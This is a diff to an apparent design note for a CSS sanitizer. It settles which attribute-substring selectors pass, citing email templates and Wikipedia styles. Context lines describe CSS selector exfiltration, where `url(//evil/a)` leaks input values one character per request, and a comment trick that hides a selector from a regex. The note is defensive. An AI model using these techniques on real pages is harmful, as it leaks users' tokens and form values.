@@ -426,6 +426,16 @@ url(//evil/a) }` leaks an input's value one character per request, and `@font-fa
 Exact-match selectors, web fonts without `unicode-range`, and external images in the element
 stay allowed.
 
+Substring selectors on `style`, `src` and `class` pass (settled 2026-10-13). Every
+real-content hit in the corpus was on `style` or `src`: 24 each, from the Cerberus email
+templates (`div[style*="margin: 16px 0"]`, a Gmail fix line) and Wikipedia's own styles
+(`img[src*="Wiktionary-logo"]`). None of the three holds a token. The secrets on a page are
+in `value`, `content`, `href` and `data-*`, so the rule is a short list of names that pass,
+not a list of names to refuse. Rejected: refusing the selector only when the same block has a
+`url()` to another host. Wikipedia's blocks load their icons from upload.wikimedia.org, so it
+still refused them, and it needed a second scan over the block. A signed image URL in a `src`
+could be read this way; it is worth little to an attacker and was accepted.
+
 Comments and quoted strings are removed before the regex runs (settled 2026-09-20; removed
 rather than blanked to a space since 2026-09-21, because the CSS tokenizer drops a comment
 without adding whitespace, so `[*/**/|x^=a]` reads `[*|x^=a]` to a browser, and joining the
